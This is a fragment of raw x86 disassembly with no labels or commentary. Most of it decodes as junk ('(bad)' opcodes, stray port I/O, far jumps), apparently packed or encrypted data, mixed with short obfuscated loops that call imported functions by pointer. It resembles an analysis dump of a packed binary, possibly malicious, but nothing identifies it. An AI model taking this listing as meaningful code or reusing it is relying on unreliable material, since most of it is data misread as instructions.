  40af43:	mov    ecx,0xa4b5338c
  40af48:	pop    edx
  40af49:	mov    ebx,gs
  40af4b:	push   ss
  40af4c:	(bad)  [esi+0x16]
  40af4f:	fnstenv [ecx+0x78]
  40af52:	xchg   ecx,eax
  40af53:	xor    BYTE PTR [ecx+0x7c16dda3],0x6c
  40af5a:	dec    esi
  40af5b:	inc    eax
  40af5c:	fidiv  WORD PTR [ecx+ecx*4]
  40af5f:	push   edi
  40af60:	jp     0x40afa7
  40af62:	push   0xae211500
  40af67:	mov    cl,0x21
  40af69:	in     al,dx
  40af6a:	jmp    0xd1f8:0xdfdded7c
  40af71:	es cmc 
  40af73:	mov    bh,0x82
  40af75:	cmp    al,0x86
  40af77:	sbb    ah,bl
  40af79:	push   0xffffffe8
  40af7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af7c:	cdq    
  40af7d:	xchg   esi,eax
  40af7e:	imul   edi,DWORD PTR [eax+0x7],0xffffff86
  40af82:	(bad)  
  40af83:	cmp    eax,0x9c427478
  40af88:	jmp    0x73643f93
  40af8d:	adc    ch,BYTE PTR [edi]
  40af8f:	jns    0x40affe
  40af91:	pop    eax
  40af92:	cli    
  40af93:	fsub   QWORD PTR [edx+esi*8]
  40af96:	out    dx,eax
  40af97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af98:	and    al,0x10
  40af9a:	loope  0x40afab
  40af9c:	mov    dh,0xf1
  40af9e:	inc    eax
  40af9f:	pop    DWORD PTR [ebp-0x46]
  40afa2:	and    DWORD PTR [eax-0x620e224a],ecx
  40afa8:	xchg   edx,eax
  40afa9:	xchg   edx,eax
  40afaa:	jp     0x40af6f
  40afac:	xchg   ecx,eax
  40afad:	hlt    
  40afae:	div    ch
  40afb0:	push   0x6e
  40afb2:	ret    
  40afb3:	xchg   edx,eax
  40afb4:	pop    ecx
  40afb5:	pusha  
  40afb6:	xchg   ecx,eax
  40afb7:	xchg   BYTE PTR [esi-0x5674c210],bh
  40afbd:	retf   0x3259
  40afc0:	mov    al,ds:0x3e68edc9
  40afc5:	(bad)  
  40afc6:	fidivr WORD PTR [edi+0x1882d479]
  40afcc:	push   esp
  40afcd:	mov    DWORD PTR [ebp+0x22],esp
  40afd0:	xor    DWORD PTR [esi-0x299d8764],esp
  40afd6:	mov    eax,ds:0x109c6a9a
  40afdb:	jge    0x40b047
  40afdd:	dec    ecx
  40afde:	sti    
  40afdf:	int3   
  40afe0:	(bad)  
  40afe1:	push   0xffffffe8
  40afe3:	lahf   
  40afe4:	mov    bl,0x1f
  40afe6:	push   eax
  40afe7:	in     eax,0xa5
  40afe9:	sbb    bh,bl
  40afeb:	xchg   DWORD PTR [ebx-0x52],edx
  40afee:	push   eax
  40afef:	sub    eax,0x61da48fc
  40aff4:	out    dx,al
  40aff5:	pop    eax
  40aff6:	mov    ds:0x44125690,al
  40affb:	xchg   ecx,eax
  40affc:	js     0x40afeb
  40affe:	add    al,0x59
  40b000:	out    dx,al
  40b001:	lods   al,BYTE PTR ds:[esi]
  40b002:	les    esp,FWORD PTR [edi-0x77]
  40b005:	sub    eax,0xa6887ba5
  40b00a:	aas    
  40b00b:	sti    
  40b00c:	cmp    al,0x53
  40b00e:	push   ebx
  40b00f:	lock mov ebp,0x9f5d5c5b
  40b015:	and    DWORD PTR [ecx],0xea7b9dc1
  40b01b:	(bad)  
  40b01c:	out    0x6f,eax
  40b01e:	xor    ah,BYTE PTR [ecx-0x14]
  40b021:	mov    bl,0xec
  40b023:	add    al,0x21
  40b025:	stos   BYTE PTR es:[edi],al
  40b026:	lahf   
  40b027:	add    eax,0x44730e4e
  40b02c:	pop    ebx
  40b02d:	mov    esi,0xa9a6775a
  40b032:	inc    esi
  40b033:	(bad)  
  40b034:	cdq    
  40b035:	fisub  WORD PTR [esi]
  40b037:	popa   
  40b038:	daa    
  40b039:	ret    0x883a
  40b03c:	push   ebp
  40b03d:	ss push cs
  40b03f:	mov    cl,dl
  40b041:	or     al,0xb8
  40b043:	push   esp
  40b044:	cmp    BYTE PTR [eax+0x71f7b9b],dh
  40b04a:	push   es
  40b04b:	call   0xa49501a9
  40b050:	push   ss
  40b051:	idiv   DWORD PTR [eax+0x59]
  40b054:	jp     0xfbba4f34
  40b05a:	xchg   ebp,eax
  40b05b:	das    
  40b05c:	sub    esp,eax
  40b05e:	ins    DWORD PTR es:[edi],dx
  40b05f:	pop    edx
  40b060:	mov    ebx,DWORD PTR [ebx]
  40b062:	xchg   ecx,eax
  40b063:	cmp    eax,0x6ffc50e6
  40b068:	rol    DWORD PTR [edi+0x4cf27d7],cl
  40b06e:	jb     0x40b00d
  40b070:	push   0x73
  40b072:	(bad)  
  40b073:	xor    DWORD PTR [eax],edx
  40b075:	sahf   
  40b076:	pusha  
  40b077:	mov    bl,0xde
  40b079:	dec    esp
  40b07a:	pop    ebp
  40b07b:	adc    BYTE PTR [esi-0x1d],al
  40b07e:	dec    esi
  40b07f:	stc    
  40b080:	test   eax,0x145fac8a
  40b085:	call   0xd9c8:0x5572ac11
  40b08c:	jns    0x40b0d1
  40b08e:	js     0x40b013
  40b090:	inc    edx
  40b091:	fwait
  40b092:	and    DWORD PTR [ebp+0x4f],0x48
  40b096:	cdq    
  40b097:	cmp    ebx,DWORD PTR [esi+0x33a1e6b1]
  40b09d:	ret    0xf233
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    dl,BYTE PTR [ebx]
  40b0da:	pop    esi
  40b0db:	imul   ebp,DWORD PTR [esi],0xffffff9d
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b0bb
  40b0e6:	inc    ebp
  40b0e7:	push   edx
  40b0e8:	enter  0x2704,0xd9
  40b0ec:	popf   
  40b0ed:	push   0x74abe38c
  40b0f2:	xor    al,0x3d
  40b0f4:	fnsave [ebx+edx*2-0xc49038]
  40b0fb:	popa   
  40b0fc:	jge    0x40b0da
  40b0fe:	stc    
  40b0ff:	push   esp
  40b100:	fsub   QWORD PTR [ecx+0x509f21c5]
  40b106:	out    0x2e,al
  40b108:	gs jle 0x40b13f
  40b10b:	push   ebp
  40b10c:	out    0xb5,eax
  40b10e:	sub    ebx,DWORD PTR [bx+si]
  40b111:	xchg   ebx,eax
  40b112:	jo     0x40b0fc
  40b114:	mov    esp,DWORD PTR [edi]
  40b116:	jp     0x40b0c1
  40b118:	push   cs
  40b119:	mov    dl,0x95
  40b11b:	call   0x6b26fd5a
  40b120:	push   ecx
  40b121:	push   edi
  40b122:	mov    ebx,0xdccb2748
  40b127:	pop    ss
  40b128:	mov    ch,ah
  40b12a:	arpl   WORD PTR [ecx-0x35],di
  40b12d:	jge    0x40b0b2
  40b12f:	push   ebp
  40b130:	fisttp WORD PTR [esi-0x6d7daa61]
  40b136:	jecxz  0x40b0fa
  40b138:	call   0x79643f42
  40b13d:	(bad)  
  40b13e:	stos   BYTE PTR es:[edi],al
  40b13f:	sbb    DWORD PTR [edx-0x6f],ecx
  40b142:	add    eax,0xc1cd22b8
  40b147:	adc    DWORD PTR [ebx-0xd5aa2ac],ebx
  40b14d:	add    ah,BYTE PTR [esi+eax*2]
  40b150:	push   esp
  40b151:	shr    BYTE PTR [ebp-0x2ffdc820],1
  40b157:	inc    ecx
  40b158:	ins    BYTE PTR es:[edi],dx
  40b159:	shl    DWORD PTR [ebx+0x3c229936],0x23
  40b160:	mov    ecx,0x223e625f
  40b165:	add    ebx,edi
  40b167:	cs out 0xf,eax
  40b16a:	mov    WORD PTR [edi-0x3eff71e3],?
  40b170:	and    esi,esp
  40b172:	(bad)  
  40b173:	arpl   WORD PTR [ecx-0x440ddf18],ax
  40b179:	neg    esp
  40b17b:	sub    BYTE PTR [esi-0x313a36f6],0x4c
  40b182:	out    dx,eax
  40b183:	pop    esi
  40b184:	mov    eax,0x7224514b
  40b189:	aaa    
  40b18a:	pop    ds
  40b18b:	jne    0x40b164
  40b18d:	lods   al,BYTE PTR ds:[esi]
  40b18e:	push   ecx
  40b18f:	jmp    0xd159:0x5a3ba688
  40b196:	sbb    eax,0x85e64727
  40b19b:	in     al,dx
  40b19c:	inc    edx
  40b19d:	shl    BYTE PTR [esi],1
  40b19f:	inc    ecx
  40b1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1a1:	jae    0x40b217
  40b1a3:	mov    ds:0x47f8ab87,al
  40b1a8:	mov    bl,BYTE PTR [ebx-0x69102897]
  40b1ae:	push   edi
  40b1af:	pushf  
  40b1b0:	enter  0x3d24,0x1
  40b1b4:	repz xlat BYTE PTR ds:[ebx]
  40b1b6:	mov    gs,eax
  40b1b8:	jns    0x40b157
  40b1ba:	push   edx
  40b1bb:	mov    ah,0xc1
  40b1bd:	nop
  40b1be:	cmp    DWORD PTR [esi+0x60f79cda],esp
  40b1c4:	imul   edx,DWORD PTR [edx+eax*8+0x1d2321ae],0xfe5e68e5
  40b1cf:	inc    eax
  40b1d0:	xor    DWORD PTR cs:[edi],0x66
  40b1d4:	loopne 0x40b1ff
  40b1d6:	dec    esi
  40b1d7:	mov    cl,0xdc
  40b1d9:	out    0xe9,al
  40b1db:	iret   
  40b1dc:	jns    0x40b1b3
  40b1de:	cwde   
  40b1df:	fmul   QWORD PTR [ecx+0x10]
  40b1e2:	cmp    eax,0xa9c47011
  40b1e7:	or     eax,0x8f503001
  40b1ec:	fsub   QWORD PTR [ebp+0x75]
  40b1ef:	in     eax,0x6f
  40b1f1:	inc    ecx
  40b1f2:	xlat   BYTE PTR ds:[ebx]
  40b1f3:	fistp  WORD PTR [eax+edi*1-0x44fcc4ef]
  40b1fa:	cmp    bl,BYTE PTR [ecx+0x401b9db1]
  40b200:	daa    
  40b201:	pop    ecx
  40b202:	pop    ebx
  40b203:	mov    cl,0x37
  40b205:	daa    
  40b206:	push   ss
  40b207:	dec    esp
  40b208:	ins    DWORD PTR es:[edi],dx
  40b209:	test   BYTE PTR [edx+eiz*4+0x51],dl
  40b20d:	lods   eax,DWORD PTR ds:[esi]
  40b20e:	pushf  
  40b20f:	das    
  40b210:	adc    ch,0x94
  40b213:	shl    DWORD PTR [ebx-0x328fbaa7],cl
  40b219:	or     DWORD PTR [di+0x1e],esi
  40b21d:	push   esp
  40b21e:	jo     0x40b201
  40b220:	mov    esp,0xbfc2ec55
  40b225:	mov    bl,0xa9
  40b227:	mov    ds:0x50a3f716,al
  40b22c:	cmc    
  40b22d:	dec    esi
  40b22e:	rol    BYTE PTR [ebp-0x5b599039],cl
  40b234:	sbb    dl,cl
  40b236:	inc    esp
  40b237:	xor    al,0x77
  40b239:	hlt    
  40b23a:	sub    edx,DWORD PTR [ebx-0x16f61ec2]
  40b240:	imul   esp,ebx,0x36
  40b243:	xchg   esp,eax
  40b244:	into   
  40b245:	lods   eax,DWORD PTR ds:[esi]
  40b246:	lahf   
  40b247:	lock loope 0x40b20f
  40b24a:	xor    BYTE PTR [eax-0x470f83e],bh
  40b250:	cmp    ebp,DWORD PTR [eax-0x19]
  40b253:	and    BYTE PTR [esi],cl
  40b255:	addr16 xchg edx,eax
  40b257:	lea    di,[edi]
  40b25a:	push   eax
  40b25b:	cs scas al,BYTE PTR es:[edi]
  40b25d:	test   eax,0x945b109a
  40b262:	pop    esp
  40b263:	mov    ecx,0xe7a2eb60
  40b268:	hlt    
  40b269:	mov    ah,al
  40b26b:	mov    DWORD PTR [ecx-0x4b],ebx
  40b26e:	fdivr  DWORD PTR [edi+0x3f]
  40b271:	test   al,0xf4
  40b273:	pop    esi
  40b274:	pop    edi
  40b275:	std    
  40b276:	or     al,0xb1
  40b278:	cmp    eax,0x7765e876
  40b27d:	xchg   edi,eax
  40b27e:	dec    esp
  40b27f:	add    ebx,eax
  40b281:	hlt    
  40b282:	lock dec eax
  40b284:	or     DWORD PTR [ecx+0x22],0x580ac53
  40b28b:	or     eax,0x916418b4
  40b290:	xor    al,0x66
  40b292:	xor    eax,0x329c1944
  40b297:	cmp    edx,ecx
  40b299:	cmp    al,0x12
  40b29b:	test   DWORD PTR [edx+0x2801727c],0x9fffad06
  40b2a5:	ja     0x40b253
  40b2a7:	xor    al,BYTE PTR [edx-0x71]
  40b2aa:	push   0x97a0ecbd
  40b2af:	jo     0x40b27e
  40b2b1:	or     BYTE PTR fs:[edi],cl
  40b2b4:	adc    ebp,DWORD PTR [ebp-0x5c291809]
  40b2ba:	icebp  
  40b2bb:	lods   al,BYTE PTR ds:[esi]
  40b2bc:	pusha  
  40b2bd:	aaa    
  40b2be:	sub    DWORD PTR [edx],edi
  40b2c0:	and    al,0xc8
  40b2c2:	xor    al,0x5e
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x4306ee
  40b2d3:	mov    ecx,DWORD PTR ds:0x4306fa
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	xor    al,0x77
  40b2f2:	stc    
  40b2f3:	pop    ebp
  40b2f4:	sti    
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b317
  40b2fd:	xchg   esp,eax
  40b2fe:	adc    cl,bh
  40b300:	pop    esp
  40b301:	xor    eax,0x1dc644c1
  40b306:	(bad)  
  40b307:	push   cs
  40b308:	and    BYTE PTR [ebx],bl
  40b30a:	out    0x4b,al
  40b30c:	or     ch,BYTE PTR [esi]
  40b30e:	mov    BYTE PTR [edi+0x36e929b1],dh
  40b314:	pop    esp
  40b315:	scas   eax,DWORD PTR es:[edi]
  40b316:	xchg   edx,eax
  40b317:	ja     0x40b30e
  40b319:	inc    esi
  40b31a:	sbb    DWORD PTR [esi],ecx
  40b31c:	popa   
  40b31d:	sub    eax,0xf3b2d161
  40b322:	out    dx,al
  40b323:	std    
  40b324:	pushf  
  40b325:	repnz test eax,0x3c361376
  40b32b:	adc    DWORD PTR [eax-0x41],esp
  40b32e:	pusha  
  40b32f:	push   esp
  40b330:	or     BYTE PTR [esi-0x6682e0ee],ah
  40b336:	je     0x40b2bc
  40b338:	rcr    dl,0x8
  40b33b:	aas    
  40b33c:	repnz xchg esp,eax
  40b33e:	ret    0x67ca
  40b341:	push   es
  40b342:	aaa    
  40b343:	mov    ebp,0xef130910
  40b348:	push   ebp
  40b349:	cmp    al,0xf5
  40b34b:	xchg   DWORD PTR [edx],edi
  40b34d:	pop    esi
  40b34e:	ins    DWORD PTR es:[edi],dx
  40b34f:	mov    DWORD PTR [eax-0x6d],0x749b0db2
  40b356:	iret   
  40b357:	jb     0x40b371
  40b359:	add    eax,0x3ffe0df2
  40b35e:	sti    
  40b35f:	test   dh,0x2a
  40b362:	push   ebp
  40b363:	gs push 0x3b
  40b366:	out    0x9a,eax
  40b368:	push   eax
  40b369:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b36b:	rcr    ebp,1
  40b36d:	rcl    DWORD PTR [ebp-0x71],0xff
  40b371:	push   eax
  40b372:	and    DWORD PTR [ecx+0x4d2a86a8],ebx
  40b378:	pop    ebp
  40b379:	mov    ebp,0xf24a8fb9
  40b37e:	retf   
  40b37f:	cmp    bl,BYTE PTR [ebp+0x65]
  40b382:	pop    ds
  40b383:	add    BYTE PTR [ebx+0x26],0xda
  40b387:	or     BYTE PTR [edx+0x56],dh
  40b38a:	lahf   
  40b38b:	mov    eax,ds:0xf690526d
  40b390:	js     0x40b3fb
  40b392:	pop    ebp
  40b393:	jbe    0x40b35e
  40b395:	scas   al,BYTE PTR es:[edi]
  40b396:	mov    al,ds:0x19cfaf01
  40b39b:	xor    bh,BYTE PTR [ebx+edi*4]
  40b39e:	(bad)  
  40b39f:	adc    BYTE PTR [ecx+0x503bec01],0xdf
  40b3a6:	cmp    ebp,esi
  40b3a8:	xchg   ebp,eax
  40b3a9:	(bad)  
  40b3aa:	mov    edi,0x8fc6dedf
  40b3af:	in     al,0xaf
  40b3b1:	out    dx,al
  40b3b2:	add    BYTE PTR [ebp-0x5],ch
  40b3b5:	aaa    
  40b3b6:	pusha  
  40b3b7:	fcmove st,st(5)
  40b3b9:	icebp  
  40b3ba:	push   eax
  40b3bb:	pop    ebp
  40b3bc:	xchg   ecx,eax
  40b3bd:	imul   edx,DWORD PTR [esi-0x7152f475],0xf2f3be18
  40b3c7:	ret    
  40b3c8:	test   eax,0xec92dce6
  40b3cd:	stos   DWORD PTR es:[edi],eax
  40b3ce:	rol    BYTE PTR [ebx],1
  40b3d0:	push   esi
  40b3d1:	loop   0x40b420
  40b3d3:	es and eax,0x24b5cead
  40b3d9:	or     eax,0xe91ca782
  40b3de:	dec    edi
  40b3df:	gs cmp al,0xc8
  40b3e2:	out    0x15,al
  40b3e4:	adc    DWORD PTR [ebp+0x1b],eax
  40b3e7:	je     0x40b413
  40b3e9:	mov    ds:0x70ffd593,al
  40b3ee:	fidiv  DWORD PTR [ecx-0x58c8a480]
  40b3f4:	sub    BYTE PTR [ebx],bh
  40b3f6:	xor    al,0xe
  40b3f8:	ja     0x40b3f4
  40b3fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3fc:	scas   eax,DWORD PTR es:[edi]
  40b3fd:	pop    edi
  40b3fe:	xchg   esi,eax
  40b3ff:	ins    DWORD PTR es:[edi],dx
  40b400:	js     0x40b3d5
  40b402:	pop    ds
  40b403:	cli    
  40b404:	cmp    BYTE PTR [ecx],dh
  40b406:	xchg   ecx,eax
  40b407:	data16 mov bh,0x45
  40b40a:	pusha  
  40b40b:	pop    esp
  40b40c:	sub    al,ch
  40b40e:	dec    ecx
  40b40f:	jg     0x40b467
  40b411:	aas    
  40b412:	int3   
  40b413:	mov    al,ds:0x52bb1593
  40b418:	(bad)  
  40b41a:	sub    eax,0xf2e21e6
  40b41f:	repnz push ebx
  40b421:	(bad)  
  40b422:	pop    ebp
  40b423:	and    bh,cl
  40b425:	mov    ch,BYTE PTR [edi+0x730fe29e]
  40b42b:	mov    esi,0xd374921a
  40b430:	fsub   st,st(3)
  40b432:	xchg   ebx,eax
  40b433:	inc    esi
  40b434:	cld    
  40b435:	imul   edx,ecx,0x46
  40b438:	bound  eax,QWORD PTR [ecx-0x2b]
  40b43b:	sbb    DWORD PTR [ecx+0x35fc45c7],esi
  40b441:	test   DWORD PTR [eax+edi*8+0x6ce05c7],ebx
  40b448:	inc    ebx
  40b449:	add    BYTE PTR [ecx],dl
  40b44b:	add    BYTE PTR [eax],al
  40b44d:	add    BYTE PTR [ebx+0x4306ce3d],al
  40b453:	add    BYTE PTR [eax],al
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x4306ce,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42ec68
  40b479:	mov    eax,ds:0x4306ce
  40b47e:	dec    eax
  40b47f:	mov    ds:0x4306ce,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x43062e,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x4306c2
  40b4aa:	sbb    DWORD PTR ds:0x42e8e2,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ef94
  40b4b8:	sub    DWORD PTR ds:0x43060e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x4306c6,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430616,0x42e8ea
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ef9c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e8e2,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x4306c6,0x430612
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e8de,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x430626,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x430626
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x430626,edi
  40b536:	cmp    DWORD PTR ds:0x430626,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x430626,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ef9c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42ec6c
  40b560:	cmp    DWORD PTR ds:0x430626,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x430626
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x430626,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430612
  40b591:	xor    DWORD PTR ds:0x43063a,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x43063e,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430606
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x4306be,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x4306be
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x4306be,edi
  40b5c9:	cmp    DWORD PTR ds:0x4306be,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42ec70
  40b5f7:	cmp    DWORD PTR ds:0x4306be,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x4306be
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x4306be,edi
  40b613:	cmp    DWORD PTR ds:0x4306be,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x1b974dc4
  40b63f:	inc    eax
  40b640:	pop    ds
  40b641:	mov    esp,0x3f7e7ee5
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b6c2
  40b64a:	fs pop ebx
  40b64c:	shl    BYTE PTR [ebp-0x52c33733],cl
  40b652:	jae    0x40b676
  40b654:	jecxz  0x40b634
  40b656:	and    ah,BYTE PTR [edi]
  40b658:	mov    ah,0xe1
  40b65a:	xor    BYTE PTR [esi-0x63],0xa
  40b65e:	mov    dh,0x12
  40b660:	jmp    0x40b6da
  40b662:	sbb    DWORD PTR [edi+0xd],esi
  40b665:	pop    eax
  40b666:	cmp    bl,ch
  40b668:	pop    ss
  40b669:	push   esi
  40b66a:	push   0x837196e5
  40b66f:	mov    al,ds:0x81344569
  40b674:	inc    edi
  40b675:	ret    
  40b676:	popa   
  40b677:	fwait
  40b678:	stc    
  40b679:	jg     0x40b6eb
  40b67b:	jp     0x40b616
  40b67d:	inc    edx
  40b67e:	jo     0x40b6ba
  40b680:	(bad)  
  40b681:	clc    
  40b682:	outs   dx,BYTE PTR ds:[esi]
  40b683:	and    eax,DWORD PTR [ebp+0x505c80f7]
  40b689:	ret    
  40b68a:	dec    ebp
  40b68b:	or     ebp,DWORD PTR [ecx+0x52]
  40b68e:	ficomp WORD PTR [ebx]
  40b690:	add    DWORD PTR [ebx*4-0x68edff53],eax
  40b697:	mov    esi,0x89905119
  40b69c:	popa   
  40b69d:	(bad)  
  40b69e:	in     eax,dx
  40b69f:	sub    bl,dl
  40b6a1:	sti    
  40b6a2:	mov    dl,0x5e
  40b6a4:	iret   
  40b6a5:	mov    esi,0xb1e932db
  40b6aa:	adc    ecx,esp
  40b6ac:	stos   DWORD PTR es:[edi],eax
  40b6ad:	gs pop ecx
  40b6af:	stc    
  40b6b0:	adc    bh,BYTE PTR [edx]
  40b6b2:	mov    ebx,fs
  40b6b4:	ss bnd jne 0x40b708
  40b6b8:	fist   WORD PTR [esi+0x32c871b8]
  40b6be:	mov    ds,ecx
  40b6c0:	xchg   ecx,eax
  40b6c1:	dec    esi
  40b6c2:	jl     0x40b6e9
  40b6c4:	adc    eax,0x4e47c6cd
  40b6c9:	dec    esi
  40b6ca:	cmp    DWORD PTR [edx+eiz*2+0xa],esi
  40b6ce:	call   0x2f75c276
  40b6d3:	inc    esi
  40b6d4:	mov    bl,0xde
  40b6d6:	ret    0xd98d
  40b6d9:	aas    
  40b6da:	mov    al,ds:0x67075f40
  40b6df:	push   ecx
  40b6e0:	push   ss
  40b6e1:	mov    ebx,0x23393765
  40b6e6:	cwde   
  40b6e7:	inc    ebx
  40b6e8:	mov    esi,0xe2a41dae
  40b6ed:	push   cs
  40b6ee:	dec    edi
  40b6ef:	in     eax,0x6f
  40b6f1:	inc    eax
  40b6f2:	outs   dx,BYTE PTR ds:[esi]
  40b6f3:	sbb    ax,0xb56f
  40b6f7:	in     eax,0xd1
  40b6f9:	popf   
  40b6fa:	push   0xaa4ef692
  40b6ff:	in     eax,0x1c
  40b701:	sbb    al,0xdd
  40b703:	out    0xd,eax
  40b705:	xchg   edx,eax
  40b706:	in     eax,0x39
  40b708:	and    al,0x95
  40b70a:	test   eax,0x79a4af5e
  40b70f:	les    ebx,FWORD PTR [edx]
  40b711:	stos   DWORD PTR es:[edi],eax
  40b712:	and    al,0xf6
  40b714:	dec    edx
  40b715:	jp     0x40b725
  40b717:	mov    bl,0xf1
  40b719:	jo     0x40b796
  40b71b:	das    
  40b71c:	xor    BYTE PTR [edi+eax*2],0x1a
  40b720:	jmp    0x40b73e
  40b722:	mov    edi,DWORD PTR [edx-0x71548243]
  40b728:	ds ret 0x6c9c
  40b72c:	dec    esp
  40b72d:	iret   
  40b72e:	or     DWORD PTR [esi],edi
  40b730:	mov    bl,BYTE PTR ds:0x8549346d
  40b736:	and    DWORD PTR [eax+ecx*2+0x27],0x37
  40b73b:	sub    eax,0xa8cf77a9
  40b740:	pop    DWORD PTR [edx+0x2d]
  40b743:	mov    ds:0x34d0e49f,al
  40b748:	les    eax,FWORD PTR [esi]
  40b74a:	jl     0x40b6dd
  40b74c:	pop    esp
  40b74d:	sub    eax,0x698ab7a6
  40b752:	mov    eax,0xa3496619
  40b757:	jns    0x40b6f9
  40b759:	je     0x40b720
  40b75b:	and    edi,DWORD PTR [edx]
  40b75d:	mov    dl,0x91
  40b75f:	inc    eax
  40b760:	cli    
  40b761:	jmp    0x40b770
  40b763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b764:	push   ss
  40b765:	stos   BYTE PTR es:[edi],al
  40b766:	pop    ebp
  40b767:	mov    bl,0xbf
  40b769:	jecxz  0x40b770
  40b76b:	into   
  40b76c:	pop    ds
  40b76d:	sbb    DWORD PTR [esi-0x74],edx
  40b770:	mov    eax,ds:0x16a419f2
  40b775:	mov    bl,cl
  40b777:	xchg   esp,eax
  40b778:	popa   
  40b779:	outs   dx,BYTE PTR ds:[esi]
  40b77a:	arpl   sp,cx
  40b77c:	push   0xb4223564
  40b781:	sbb    al,0xd2
  40b783:	cmp    DWORD PTR [edi-0x70],eax
  40b786:	mov    ah,BYTE PTR ds:0x7589e027
  40b78c:	fsub   DWORD PTR [ecx]
  40b78e:	sbb    eax,0x430632
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x4306c2
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
